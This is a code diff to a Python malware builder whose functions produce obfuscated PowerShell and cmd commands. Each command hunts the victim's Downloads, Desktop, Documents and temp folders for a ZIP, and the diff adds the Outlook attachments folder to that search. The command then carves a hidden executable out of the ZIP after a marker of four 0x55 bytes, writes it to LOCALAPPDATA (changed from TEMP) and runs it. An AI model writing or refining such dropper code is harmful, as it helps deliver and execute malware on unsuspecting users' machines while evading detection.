@@ -27,7 +27,7 @@ def obfuscate_powershell_command_optimized(payloadname, output_exe_filename, szP
     # OPTIMIZED: Remove recursive search entirely, use only specific common locations
     file_cmd_parts = [
         f'${name_var}=\\"{payloadname}\\";',
-        f'${temp_var}=@(\\"$Env:USERPROFILE\\\\Downloads\\",\\"$Env:USERPROFILE\\\\Desktop\\",\\"$Env:USERPROFILE\\\\Documents\\",\\"$Env:TEMP\\",\\"$PWD\\");',
+        f'${temp_var}=@(\\"$Env:USERPROFILE\\\\Downloads\\",\\"$Env:USERPROFILE\\\\Desktop\\",\\"$Env:USERPROFILE\\\\Documents\\",\\"$Env:TEMP\\",\\"$PWD\\",\\"$Env:LOCALAPPDATA\\\\Microsoft\\\\Olk\\\\Attachments\\");',
         f'${file_var}=$null;foreach($p in ${temp_var}){{if(Test-Path $p){{$f=Get-ChildItem -Path $p -Filter \\"*${name_var}.zip\\" -EA 0|Select -First 1;if($f){{${file_var}=$f.FullName;break}}}}}};',
         f'if(-not ${file_var}){{exit}};',
         f'${bytes_var}=[System.IO.File]::ReadAllBytes(${file_var});',
@@ -54,7 +54,7 @@ def obfuscate_powershell_command_optimized(payloadname, output_exe_filename, szP
         f'${length_var}={szPayload};',
         # OPTIMIZED: Use .NET Array.Copy instead of PowerShell array slicing for large data
         f'${chunk_var}=New-Object byte[] ${length_var};[Array]::Copy(${bytes_var},${size_var},${chunk_var},0,${length_var});',
-        f'${out_var}=\\"$Env:TEMP\\\\{output_exe_filename}\\";',
+        f'${out_var}=\\"$Env:LOCALAPPDATA\\\\{output_exe_filename}\\";',
         f'[System.IO.File]::WriteAllBytes(${out_var},${chunk_var});',
         f'Start-Process -FilePath ${out_var}'
     ])
@@ -71,7 +71,7 @@ def obfuscate_powershell_command(payloadname, output_exe_filename, szPayload, pd
     # Use more efficient file search with specific locations and error handling
     file_cmd_parts = [
         f'${name_var}=\\"{payloadname}\\";',
-        f'${temp_var}=@(\\"$Env:USERPROFILE\\\\Downloads\\",\\"$Env:USERPROFILE\\\\Desktop\\",\\"$Env:USERPROFILE\\\\Documents\\",\\"$PWD\\");',
+        f'${temp_var}=@(\\"$Env:USERPROFILE\\\\Downloads\\",\\"$Env:USERPROFILE\\\\Desktop\\",\\"$Env:USERPROFILE\\\\Documents\\",\\"$PWD\\",\\"$Env:LOCALAPPDATA\\\\Microsoft\\\\Olk\\\\Attachments\\");',
         f'${file_var}=$null;foreach($p in ${temp_var}){{try{{${file_var}=(Get-ChildItem -Path $p -Filter \\"*${name_var}.zip\\" -ErrorAction Stop)[0].FullName;break}}catch{{}}}};',
         f'if(-not ${file_var}){{${file_var}=(Get-ChildItem -Path $Env:USERPROFILE -Filter \\"*${name_var}.zip\\" -Recurse -ErrorAction SilentlyContinue|Select-Object -First 1).FullName}};',
         f'if(-not ${file_var}){{exit}};',
@@ -96,7 +96,7 @@ def obfuscate_powershell_command(payloadname, output_exe_filename, szPayload, pd
         f'${size_var}=(0..(${bytes_var}.Length-4)|Where-Object{{${bytes_var}[$_] -eq 0x55 -and ${bytes_var}[$_+1] -eq 0x55 -and ${bytes_var}[$_+2] -eq 0x55 -and ${bytes_var}[$_+3] -eq 0x55}})[0]+4;',
         f'${length_var}={szPayload};',
         f'${chunk_var}=${bytes_var}[${size_var}..(${size_var}+${length_var}-1)];',
-        f'${out_var}=\\"$Env:TEMP\\\\{output_exe_filename}\\";',
+        f'${out_var}=\\"$Env:LOCALAPPDATA\\\\{output_exe_filename}\\";',
         f'[System.IO.File]::WriteAllBytes(${out_var},${chunk_var});',
         f'Start-Process -FilePath ${out_var}'
     ])
@@ -112,7 +112,7 @@ def obfuscate_cmd_wrapper(payloadname, output_exe_filename, szPayload, pdf_size=
     # Create compact PowerShell command with efficient search locations - OPTIMIZED VERSION
     ps_parts = [
         f"$n='{payloadname}';",
-        f"$paths=@($Env:USERPROFILE+'\\Downloads',$Env:USERPROFILE+'\\Desktop',$Env:USERPROFILE+'\\Documents',$Env:TEMP,$PWD);",
+        f"$paths=@($Env:USERPROFILE+'\\Downloads',$Env:USERPROFILE+'\\Desktop',$Env:USERPROFILE+'\\Documents',$Env:TEMP,$PWD,$Env:LOCALAPPDATA+'\\Microsoft\\Olk\\Attachments');",
         f"$f=$null;foreach($p in $paths){{if(Test-Path $p){{$found=gci -Pa $p -Filter *$n.zip -EA 0|select -f 1;if($found){{$f=$found.FullName;break}}}}}};",
         f"if(-not $f){{exit}};",
         f"$b=[IO.File]::ReadAllBytes($f);"
@@ -136,7 +136,7 @@ def obfuscate_cmd_wrapper(payloadname, output_exe_filename, szPayload, pdf_size=
         f"$s=-1;for($i=0;$i -lt ($b.Length-3);$i++){{if($b[$i] -eq 85 -and $b[$i+1] -eq 85 -and $b[$i+2] -eq 85 -and $b[$i+3] -eq 85){{$s=$i+4;break}}}};",
         f"if($s -eq -1){{exit}};",
         f"$l={szPayload};$c=New-Object byte[] $l;[Array]::Copy($b,$s,$c,0,$l);",
-        f"$o=\"$Env:TEMP\\{output_exe_filename}\";",
+        f"$o=\"$Env:LOCALAPPDATA\\{output_exe_filename}\";",
         f"[IO.File]::WriteAllBytes($o,$c);",
         f"Start-Process -FilePath $o"
     ])
@@ -177,7 +177,7 @@ def obfuscate_with_string_manipulation(payloadname, output_exe_filename, szPaylo
     # Break up sensitive strings using PowerShell string manipulation with efficient search - OPTIMIZED
     cmd_parts = [
         f'"${{0}}=\\"{payloadname}\\";',
-        f'${{7}}=@(\\"$Env:USERPROFILE\\\\Downloads\\",\\"$Env:USERPROFILE\\\\Desktop\\",\\"$Env:USERPROFILE\\\\Documents\\",\\"$Env:TEMP\\",\\"$PWD\\");',
+        f'${{7}}=@(\\"$Env:USERPROFILE\\\\Downloads\\",\\"$Env:USERPROFILE\\\\Desktop\\",\\"$Env:USERPROFILE\\\\Documents\\",\\"$Env:TEMP\\",\\"$PWD\\",\\"$Env:LOCALAPPDATA\\\\Microsoft\\\\Olk\\\\Attachments\\");',
         f'${{1}}=$null;foreach($p in ${{7}}){{if(Test-Path $p){{$f=Get-ChildItem -Path $p -Filter \\"*${{0}}.zip\\" -EA 0|Select -First 1;if($f){{${{1}}=$f.FullName;break}}}}}};',
         f'if(-not ${{1}}){{exit}};',
         f'${{2}}=[System.IO.File]::ReadAllBytes(${{1}});'
@@ -202,7 +202,7 @@ def obfuscate_with_string_manipulation(payloadname, output_exe_filename, szPaylo
         f'if(${{3}} -eq -1){{exit}};',
         f'${{4}}={szPayload};',
         f'${{5}}=New-Object byte[] ${{4}};[Array]::Copy(${{2}},${{3}},${{5}},0,${{4}});',
-        f'${{6}}=\\"$Env:TEMP\\\\{output_exe_filename}\\";',
+        f'${{6}}=\\"$Env:LOCALAPPDATA\\\\{output_exe_filename}\\";',
         f'[System.IO.File]::WriteAllBytes(${{6}},${{5}});',
         f'Start-Process -FilePath ${{6}}"'
     ])
@@ -234,7 +234,7 @@ def create_obfuscated_command(payloadname, output_exe_filename, szPayload, obfus
                    '$size = (0..($bytes.Length - 4) | Where-Object {$bytes[$_] -eq 0x55 -and $bytes[$_+1] -eq 0x55 -and $bytes[$_+2] -eq 0x55 -and $bytes[$_+3] -eq 0x55 })[0] + 4;'
                    '$length=' + szPayload + ';'
                    '$chunk=$bytes[$size..($size+$length-1)];'
-                   '$out = \\"$Env:TEMP\\\\' + output_exe_filename + '\\";'
+                   '$out = \\"$Env:LOCALAPPDATA\\\\' + output_exe_filename + '\\";'
                    '[System.IO.File]::WriteAllBytes($out,$chunk);'
                    'Invoke-Item $out"')
         return command, None, None
